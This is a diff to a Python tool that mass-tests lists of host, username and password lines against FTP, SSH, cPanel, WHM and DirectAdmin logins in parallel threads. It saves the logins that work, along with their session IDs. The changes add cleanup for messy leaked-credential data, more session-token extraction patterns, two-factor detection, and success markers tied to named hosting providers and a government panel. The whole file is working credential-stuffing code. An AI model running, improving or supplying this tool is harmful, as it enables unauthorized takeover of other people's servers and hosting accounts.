@@ -76,7 +76,7 @@ def update_stats(service, result, result_type='success'):
             stats[f'{service}_failed'] += 1
 
 def parse_credentials(line):
-    """Enhanced credential parsing with validation"""
+    """Enhanced credential parsing with validation and malformed data handling"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
@@ -94,6 +94,27 @@ def parse_credentials(line):
         
         host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
         
+        # Handle malformed data where session info or paths got mixed in
+        # Case 1: Password contains session paths or frontend URLs
+        if 'cpsess' in password and ('/frontend/' in password or '/index.html' in password):
+            log_message(f"SKIPPED - Malformed: session path as password in {line}", "INFO")
+            return None
+        
+        # Case 2: Hostname contains session IDs
+        if 'cpsess' in host and len(host) > 100:  # Abnormally long hostname with session
+            log_message(f"SKIPPED - Malformed: session ID in hostname in {line}", "INFO")
+            return None
+        
+        # Case 3: Username that is just a port number
+        if username.isdigit() and len(username) == 4:  # Likely a port number
+            log_message(f"SKIPPED - Malformed: port number as username in {line}", "INFO")
+            return None
+        
+        # Case 4: Empty or placeholder values
+        if username.lower() in ['user', 'empty', 'mail', '{mail}'] or password.lower() in ['pass', 'password', 'empty']:
+            log_message(f"SKIPPED - Placeholder credentials in {line}", "INFO")
+            return None
+        
         # Validate inputs
         if not all([host, username, password]):
             log_message(f"Empty fields in credential: {line}", "ERROR")
@@ -101,8 +122,9 @@ def parse_credentials(line):
         
         # Clean and validate hostname
         host = clean_hostname(host)
-        if not is_valid_hostname(host):
-            log_message(f"Invalid hostname: {host}", "ERROR")
+        hostname_only = extract_hostname_for_validation(host)
+        if not is_valid_hostname(hostname_only):
+            log_message(f"Invalid hostname: {hostname_only} (from: {host})", "ERROR")
             return None
         
         return host, username, password
@@ -112,13 +134,20 @@ def parse_credentials(line):
         return None
 
 def clean_hostname(host):
-    """Clean and normalize hostname"""
+    """Clean and normalize hostname, separating hostname from port and removing embedded session IDs"""
     # Remove any leading/trailing whitespace
     host = host.strip()
     
     # Remove protocol if present
     if host.startswith(('http://', 'https://')):
         host = host.split('://', 1)[1]
+    
+    # Handle embedded session IDs in hostname (malformed data)
+    if 'cpsess' in host:
+        # Split at cpsess and take only the hostname part
+        host = host.split('cpsess')[0]
+        # Remove trailing colon if present
+        host = host.rstrip(':')
     
     # Handle malformed hostnames starting with dash
     if host.startswith('-'):
@@ -131,6 +160,14 @@ def clean_hostname(host):
     # Remove any trailing slash
     host = host.rstrip('/')
     
+    # Extract hostname part (remove port if present) for validation
+    # But return the full host:port for later use
+    return host
+
+def extract_hostname_for_validation(host):
+    """Extract just the hostname part for validation (removes port)"""
+    if ':' in host and not host.startswith('['):  # Not IPv6
+        return host.split(':')[0]
     return host
 
 def is_valid_hostname(hostname):
@@ -236,10 +273,11 @@ def prefilter_credentials(credentials_list):
             
             # Clean hostname for checking
             cleaned_host = clean_hostname(host_part)
+            hostname_only = extract_hostname_for_validation(cleaned_host)
             
             # Skip if invalid
-            if should_skip_host(cleaned_host):
-                log_message(f"SKIPPED - Invalid hostname: {cleaned_host}", "INFO")
+            if should_skip_host(hostname_only):
+                log_message(f"SKIPPED - Invalid hostname: {hostname_only}", "INFO")
                 continue
                 
             filtered_list.append(line)
@@ -252,35 +290,75 @@ def prefilter_credentials(credentials_list):
     return filtered_list
 
 def extract_session_id(response_text, url):
-    """Extract session ID from cPanel/WHM responses"""
+    """Extract session ID from cPanel/WHM responses based on analysis insights"""
     # Look for cpsess pattern in response text or URL redirects
     session_patterns = [
-        r'cpsess(\d+)',
-        r'/cpsess(\d+)/',
-        r'sessionID["\']:\s*["\']([^"\']+)["\']',
-        r'session_id["\']:\s*["\']([^"\']+)["\']'
+        # From analysis.md - observed patterns
+        r'cpsess(\d+)',                    # Standard cpsess pattern
+        r'/cpsess(\d+)/',                  # In URL paths
+        r'cpsess(\d+)/frontend',           # With frontend path
+        r'sessionID["\']:\s*["\']([^"\']+)["\']',  # JSON responses
+        r'session_id["\']:\s*["\']([^"\']+)["\']', # Alternative JSON
+        # Additional patterns from analysis
+        r'cpsess(\d+)/\?',                 # Query parameters
+        r'post_login=(\d+)',               # Post-login tokens
+        r'session=([^&\s"\']+)',           # Generic session tokens
     ]
     
+    # First check the URL (most reliable)
+    for pattern in session_patterns:
+        match = re.search(pattern, url)
+        if match:
+            if 'cpsess' in pattern:
+                return f"cpsess{match.group(1)}"
+            else:
+                return match.group(1)
+    
+    # Then check response text
     for pattern in session_patterns:
         match = re.search(pattern, response_text)
         if match:
-            return match.group(1) if 'cpsess' in pattern else match.group(1)
+            if 'cpsess' in pattern:
+                return f"cpsess{match.group(1)}"
+            else:
+                return match.group(1)
     
     return None
 
 def detect_tfa_requirement(response_text, status_code):
-    """Detect if Two-Factor Authentication is required"""
+    """Detect if Two-Factor Authentication is required based on analysis insights"""
     tfa_indicators = [
+        # From analysis.md - exact patterns found
         'tfatoken',
         'security code',
         'two-factor',
         'Enter the security code',
         'authentication code',
         'verification code',
-        'Security Code Required'
+        'Security Code Required',
+        # Additional patterns from analysis
+        'Security code for',  # "Enter the security code for 'username'"
+        'Continue Button',    # TFA pages have continue buttons
+        'tfatoken',          # Field name from analysis
+        'std_textbox',       # TFA field class from analysis
+        'Security code'      # TFA placeholder text
     ]
     
-    return any(indicator.lower() in response_text.lower() for indicator in tfa_indicators)
+    # Also check for TFA-specific form fields and URLs
+    tfa_form_indicators = [
+        'name="tfatoken"',
+        'id="tfatoken"',
+        'placeholder="Security code"',
+        'class="std_textbox"'
+    ]
+    
+    # Check text content
+    text_check = any(indicator.lower() in response_text.lower() for indicator in tfa_indicators)
+    
+    # Check form elements
+    form_check = any(indicator in response_text for indicator in tfa_form_indicators)
+    
+    return text_check or form_check
 
 def save_result(service, host, username, password, status, session_id=None, tfa_required=False):
     """Save successful result to appropriate output file and structured data"""
@@ -515,17 +593,26 @@ def check_login(line, login_type, session=None, timeout=15, verify_ssl=False):
         
         # Enhanced success detection based on analysis insights
         success_indicators = [
-            # Traditional indicators
-            ("status" in response_text and "security_token" in response_text),
-            # Session ID in response
+            # Session ID patterns from analysis (most reliable)
             extract_session_id(response_text, response.url) is not None,
-            # HTTP redirect with session
+            # HTTP redirect with session (from analysis examples)
             (status_code in [200, 302] and 'cpsess' in response.url),
-            # Success page indicators
+            # Specific success patterns from analysis.md
+            ("frontend/o2switch/index.html" in response.url),       # o2switch success
+            ("frontend/jupiter/index.html" in response.url),        # Kemenag government success  
+            ("frontend/paper_lantern/index.html" in response.url),  # Paper Lantern theme
+            # Page title indicators from analysis
+            ("cPanel - Espace Technique" in response_text),         # o2switch success page
+            ("cPanel - Tools" in response_text),                    # Kemenag success page
+            # URL patterns indicating success
+            ("post_login=" in response.url and status_code == 200), # Post-login redirect
+            ("login=1" in response.url and status_code == 200),     # Login success parameter
+            # Traditional indicators (keep for compatibility)
+            ("status" in response_text and "security_token" in response_text),
             ("cPanel" in response_text and "index.html" in response.url),
             ("WHM" in response_text and status_code == 200),
             # JSON response success
-            (status_code == 200 and response.headers.get('content-type', '').startswith('application/json'))
+            (status_code == 200 and response.headers.get('content-type', '').startswith('application/json') and 'error' not in response_text.lower())
         ]
         
         if any(success_indicators):
@@ -799,6 +886,7 @@ Examples:
     parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
     parser.add_argument('--max-retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
     parser.add_argument('--resume', type=str, help='Resume from specified line number in file')
+    parser.add_argument('--test-mode', action='store_true', help='Test mode: validate parsing without connecting')
     
     args = parser.parse_args()
     
@@ -868,40 +956,59 @@ Examples:
             return 1
         
         log_message(f"Testing services: {', '.join(services_to_test)}", "INFO")
-        log_message("Starting enhanced credential validation...", "INFO")
-        log_message("", "INFO")
         
-        # Setup shared session for web services
-        web_session = setup_session(args.timeout, not args.no_ssl_verify, args.max_retries)
-        
-        # Execute checks with enhanced thread pool
-        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = []
+        if args.test_mode:
+            log_message("Running in TEST MODE - validating parsing only", "INFO")
+            log_message("", "INFO")
             
+            # Test mode: validate parsing without connecting
             for line in list_data:
                 if shutdown_requested:
                     break
                 
-                # Submit tasks for each enabled service
-                if 'ftp' in services_to_test:
-                    futures.append(executor.submit(check_ftp, line, args.timeout))
-                if 'ssh' in services_to_test:
-                    futures.append(executor.submit(check_ssh, line, args.timeout))
-                if 'cpanel' in services_to_test:
-                    futures.append(executor.submit(check_login, line, 'cpanel', web_session, args.timeout, not args.no_ssl_verify))
-                if 'whm' in services_to_test:
-                    futures.append(executor.submit(check_login, line, 'whm', web_session, args.timeout, not args.no_ssl_verify))
-                if 'directadmin' in services_to_test:
-                    futures.append(executor.submit(check_directadmin, line, web_session, args.timeout, not args.no_ssl_verify))
+                credentials = parse_credentials(line)
+                if credentials:
+                    host, username, password = credentials
+                    log_message(f"PARSED OK - Host: {host} | User: {username} | Pass: [HIDDEN]", "SUCCESS", "TEST")
+                    stats['total_tested'] += 1
+                else:
+                    log_message(f"PARSE FAILED - Line: {line}", "FAILED", "TEST")
+                    stats['errors'] += 1
+        else:
+            log_message("Starting enhanced credential validation...", "INFO")
+            log_message("", "INFO")
             
-            # Wait for completion with progress tracking
-            for future in concurrent.futures.as_completed(futures):
-                if shutdown_requested:
-                    break
-                try:
-                    future.result()
-                except Exception as e:
-                    log_message(f"Task execution error: {e}", "ERROR")
+            # Setup shared session for web services
+            web_session = setup_session(args.timeout, not args.no_ssl_verify, args.max_retries)
+            
+            # Execute checks with enhanced thread pool
+            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+                futures = []
+                
+                for line in list_data:
+                    if shutdown_requested:
+                        break
+                    
+                    # Submit tasks for each enabled service
+                    if 'ftp' in services_to_test:
+                        futures.append(executor.submit(check_ftp, line, args.timeout))
+                    if 'ssh' in services_to_test:
+                        futures.append(executor.submit(check_ssh, line, args.timeout))
+                    if 'cpanel' in services_to_test:
+                        futures.append(executor.submit(check_login, line, 'cpanel', web_session, args.timeout, not args.no_ssl_verify))
+                    if 'whm' in services_to_test:
+                        futures.append(executor.submit(check_login, line, 'whm', web_session, args.timeout, not args.no_ssl_verify))
+                    if 'directadmin' in services_to_test:
+                        futures.append(executor.submit(check_directadmin, line, web_session, args.timeout, not args.no_ssl_verify))
+                
+                # Wait for completion with progress tracking
+                for future in concurrent.futures.as_completed(futures):
+                    if shutdown_requested:
+                        break
+                    try:
+                        future.result()
+                    except Exception as e:
+                        log_message(f"Task execution error: {e}", "ERROR")
         
         # Print final statistics
         log_message("", "INFO")
